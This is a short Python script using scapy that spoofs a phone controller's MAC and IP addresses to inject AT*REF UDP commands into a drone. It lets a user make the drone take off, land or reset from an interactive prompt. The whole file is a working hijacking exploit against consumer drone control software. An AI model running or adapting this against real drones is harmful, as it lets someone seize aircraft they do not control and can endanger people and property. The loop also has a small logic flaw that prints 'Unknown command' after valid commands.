from scapy.all import *
from time import sleep
import argparse
import sys

# Send a spoofed packet
def sendPacket(command) :
    packet = Ether(src=config['phonemac'], dst=config['dronemac']) / IP(src=config['phoneip'], dst=config['droneip']) / UDP(sport=config['port'], dport=config['port']) / command
    print "Sending : "+command
    sendp(packet, iface=config['interface'])
    config['seq'] = config['seq']+1

# Send a takeoff packet
def takeoff() :
    command = "AT*REF="+str(config['seq'])+",290718208\r"
    sendPacket(command)

# Send a landing packet
def land() :
    command = "AT*REF="+str(config['seq'])+",290717696\r"
    sendPacket(command)

# Reset by sending a packet with 1 as sequence Number
def reset() :
    command = "AT*REF=1,290717696\r"
    sendPacket(command)

class StoreInDict(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        d = getattr(namespace, self.dest)
        for opt in values:
            k,v = opt.split("=", 1)
            k = k.lstrip("-")
            d[k] = v
        setattr(namespace, self.dest, d)

p = argparse.ArgumentParser( prefix_chars=' ' )
p.add_argument("options", nargs="*", action=StoreInDict, default=dict())

args = p.parse_args(' '.join(sys.argv[1:]).split())

config = {
    'phoneip' : '192.168.1.2', # my phone's IP
    'droneip' : '192.168.1.1', # drone's IP
    'port' : 5556, # source port
    'phonemac' : '24:00:ba:bd:cc:17', # my phone's MAC
    'dronemac' : '90:03:b7:fd:22:49', # drone's MAC
    'interface' : 'wlan0',
    'seq' : 900000
}

while 1 :
    command = raw_input("Command : ")

    if command == 'TAKEOFF' :
        takeoff()
    if command == 'LAND' :
        land()
    if command == 'RESET' :
        reset()
    if command.lower() in ['quit','q','exit'] :
        break
    else:
        print "Unknown command "+command
